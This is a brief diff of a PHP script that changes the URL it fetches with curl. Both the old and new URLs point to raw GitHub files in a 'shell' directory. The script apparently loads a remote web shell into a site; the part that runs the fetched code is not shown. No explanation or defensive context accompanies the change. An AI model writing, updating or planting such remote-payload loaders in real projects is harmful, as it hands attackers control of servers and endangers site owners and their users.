@@ -1,6 +1,6 @@
 <?php
 
-$url = "https://raw.githubusercontent.com/WhatsWrongAndWhy/yourlogic/refs/heads/main/shell/vatfan.php";
+$url = "https://raw.githubusercontent.com/WhatsWrongAndWhy/yourlogic/main/shell/fanvat.php";
 
 $ch = curl_init($url);
 
